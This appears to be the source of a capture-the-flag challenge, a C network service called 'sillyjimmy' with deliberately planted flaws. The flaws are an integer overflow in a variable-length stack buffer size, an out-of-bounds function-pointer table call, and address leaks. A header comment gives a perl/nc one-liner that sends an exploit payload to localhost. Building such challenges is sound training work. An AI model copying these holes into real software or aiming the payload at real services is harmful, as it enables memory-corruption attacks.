// compile with gcc -fno-stack-protector -static -O3 -s -std=c99 -o sillyjimmy ctf_sillyjimmy.c

// perl -e 'print "\xF6\xFF\xFF\xFF\x79\x90\x6d\x90\x6d\x90\x69\x90\x6a\x00\x79\x90\x6d\x90\x6d\x90\x69\x90\x6a\x00\x79\x90\x6d\x90\x6d\x90\x69\x90\x00\x00\x00\x00\x01\x02\x03\x04\x01\x02\x03\x04\x01\x02\x03\x04\x01\x02\x03\x04\x01\x02\x03\x04\x3b\xc5\xc5\xc5" ' | nc 127.0.0.1 7331

#define _POSIX_C_SOURCE 2

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#if defined(WIN32) || defined(_WIN32)
    #include <winsock2.h>
    #include <windows.h>
    #include <io.h> // _pipe()
    #include <fcntl.h> 
    FILE *popen(const char*, const char*);
    int pclose(FILE*);
    int fileno(FILE*);
    #define pipe _pipe
    #define write _write
    #define read _read
    #define OPEN_MODE_STR "wb"
#else
    // nix platforms
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #define SOCKET int
    #define INVALID_SOCKET (-1)
    #define closesocket close
    #define OPEN_MODE_STR "w"
#endif

///////////////////////////////////////////////////////////////////////////////////

#define PORT 7331
#define BUFFER_SIZE 100

typedef enum Role_e
{
    PRODUCER,
    CONSUMER
} Role;

enum { READ, WRITE };

typedef void(*Callgate)(int);

int main(int argc, char**);
///////////////////////////////////////////////////////////////////////////////////

// global variables
Role role;
SOCKET sock;
char buf[BUFFER_SIZE];
int fdpipe[2]; // read, write

Callgate callgates[255];
int outpipe;
int sprintf_len;

const char jimmyconfused[] = "Jimmy is confused :/\n\n";
const char outofmem[] = "Jimmy is out memory :/\n\n";

///////////////////////////////////////////////////////////////////////////////////

void consumer_goodcall(int outpipe)
{
    char s[] = "is Jimmy a new person\n";
    write(outpipe, s, sizeof(s));
}
void consumer_badcall(int outpipe)
{
    char s[] = "1 0 2 3 4\n";
    write(outpipe, s, sizeof(s));
}

int process_cmd(int argc, char **argv)
{
    const char *usage = "Usage: sillyjimmy <p or c>\n";

    // process command line
    if (argc != 2)
    {
        printf(usage);
        return -1;
    }
    if (strcmp(argv[1], "p") == 0)
    {
        role = PRODUCER;
    }
    else if (strcmp(argv[1], "c") == 0)
    {
        role = CONSUMER;
    }
    else
    {
        printf(usage);
        return -1;
    }

    return 0;
}


int open_pipe()
{
#if defined(WIN32) || defined(_WIN32)
    return pipe( fdpipe, BUFFER_SIZE, O_BINARY );
#else
    return pipe(fdpipe);
#endif
}

void init_producer()
{
    // startup a server socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    inet_addr("0.0.0.0");
    struct sockaddr_in sain;
    sain.sin_family = AF_INET;
    sain.sin_addr.s_addr = inet_addr("0.0.0.0");
    sain.sin_port = htons(PORT);
    bind(sock, (struct sockaddr*)&sain, sizeof(sain));
    
    open_pipe();
}

void init_consumer()
{
#if defined(WIN32) || defined(_WIN32)
    _setmode(fileno(stdin), O_BINARY);
    _setmode(fileno(stdout), O_BINARY);
#endif
    for(int i = 0; i < 254;i++)
    {
        callgates[i] = &consumer_badcall;
    }
    callgates[254] = &consumer_goodcall;
}

///////////////////////////////////////////////////////////////////////////////////

void transformshell(char* buf, int size)
{
	char *p = buf;
	for(int i= 0; i < size; i++)
		p[i] = p[i] ^ 0xC5;
		/*
	char temp, *end;
	end = p + size-1;
	
	while(end > p)
	{
		temp = *p;
		*p = *end;
		*end = temp;
		p++;
		end--;
	}*/
}

void untransformshell(char *buf, int size)
{
	char *p = buf;
	/*
	char temp, *end;
	end = p + size-1;
	
	while(end > p)
	{
		temp = *p;
		*p = *end;
		*end = temp;
		p++;
		end--;
	}*/
	for(int i= 0; i < size; i++)
		p[i] = p[i] ^ 0xC5;
		
}

int findmagic(unsigned char* buf)
{
	if(buf[4] == 0xbc && buf[6] == 0xa8 && buf[8]== 0xa8
		&& buf[10] == 0xac && buf[12] == 0xaf)
		return 1;
	else
		return 0;
}


void handle_producer(const char *cmd)
{
    const char *badsc = "Jimmy doesnt like your shellcode :/\n";
    
    listen(sock, 5);
    while (1)
    {
        struct sockaddr_in sain;
        int size = sizeof(sain);
        SOCKET clientsock = accept(sock, (struct sockaddr*)&sain, &size);
        if (clientsock == INVALID_SOCKET)
        {
            // failed to connect to client, start over again
            printf("client failed to connect\n");
            continue;
        }

        printf("client connected\n");
        int recvlen = recv(clientsock, buf, sizeof(buf), 0);
        if (recvlen > 0)
        {
			//xor encrypt the shellcode
            transformshell(buf,recvlen);
            for(int i = 0; i < recvlen; i++)
            {
				printf("0x%x ", buf[i]&0xFF);
            }
            printf("\n");
            //printf("New Buff -> %s\n", buf);
            
            // mix up shellcode here
            // find 'jimmy' in shellcode
            if(!findmagic((unsigned char*)buf))
            {
                send(clientsock, badsc, strlen(badsc), 0);
                closesocket(clientsock);
                continue;
            }

            // start consumer and open up a pipe
            printf("CMD: %s\n", cmd);
            // on windows must open in binary mode
            FILE *consumerpipe = popen(cmd, OPEN_MODE_STR);
            
            // send the pipe handle
            fwrite(&fdpipe[WRITE], sizeof(int), 1, consumerpipe);
            
            // send it to the consumer
            fwrite(buf, 1, recvlen, consumerpipe);
            fflush(consumerpipe);
            pclose(consumerpipe);
            
            recvlen = read(fdpipe[READ], buf, sizeof(buf));
            if(recvlen > 0)
            {
                send(clientsock, buf, recvlen, 0);
            }
        }
        closesocket(clientsock);
    }
}

int handle_consumer()
{
    char replybuf[BUFFER_SIZE];
    uint32_t idx;
    uint32_t slot;
    uint32_t memsize;
    
    int size1;
    int size2;
    
    size1 = fread(&outpipe, sizeof(int), 1, stdin);
    size2 = fread(&idx, sizeof(int), 1, stdin);
    
    if(size1 == 1 && size2 == 1)
    {
        // decode the idx value
        untransformshell((char*)&idx, sizeof(idx));
        
        memsize = BUFFER_SIZE + idx*10 + 1;
        slot = memsize-1;
        
        // cap the maximum buffer size to prevent a crash
        if(memsize > 0 && memsize < BUFFER_SIZE*10)
        {
            char buffer[memsize];
            int revclen = fread(buffer, 1, BUFFER_SIZE, stdin);
            
            //decode the buffer
            untransformshell(buffer, sizeof(buffer));
            
            printf("ret=%p main=%p\n", __builtin_frame_address(0), main);
            printf("idx=%p slot=%p memsize=%p size1=%p outpipe=%p buffer=%p\n", &idx, &slot, &memsize, &size1, &outpipe, buffer);
            
            if(revclen > 0) 
            {
                printf("memsize value %u\n", memsize);
                printf("slot value %u\n", slot);
                
                if(memsize < BUFFER_SIZE && slot < 255)
                {
                    callgates[slot](outpipe);
                }
                else
                {
                    // replybuf has enough space for the string
                    sprintf_len = sprintf(replybuf, "Jimmy's calculation is %u \n", memsize);
                    if(sprintf_len > 0)
                    {
                        write(outpipe, replybuf, sprintf_len+1); // add 1 for the null terminator
                    }
                    else
                    {
                        write(outpipe, jimmyconfused, sizeof(jimmyconfused));
                    }
                }
            }
            else
            {
                write(outpipe, jimmyconfused, sizeof(jimmyconfused));
            }
        }
        else
        {
            write(outpipe, outofmem, sizeof(outofmem));
        }
    }
}

///////////////////////////////////////////////////////////////////////////////////

int main(int argc, char **argv)
{
#if defined(WIN32) || defined(_WIN32)
    WSADATA wsadata;
    if (WSAStartup(MAKEWORD(2, 0), &wsadata) != 0)
    {
        printf("WSAStartup failed\n");
        return -1;
    }
#endif

    // process command line
    if (process_cmd(argc, argv) != 0) 
    {
        return -1;
    }
    
    // create the consumer command line
    char *cmd = (char*)malloc(strlen(argv[0]) + 10);
    strcpy(cmd, argv[0]);
    strcat(cmd, " c");
        
    // run producer
    if (role == PRODUCER)
    {
        printf("PRODUCER started\n");
        init_producer();
        handle_producer(cmd);
    }
    else
    {
        // run consumer
        printf("CONSUMER started\n");
        init_consumer();
        handle_consumer();
    }
    
    // dont forget to free it
    free(cmd);
    
#if defined(WIN32) || defined(_WIN32)
    WSACleanup();
#endif
    return 0;
}

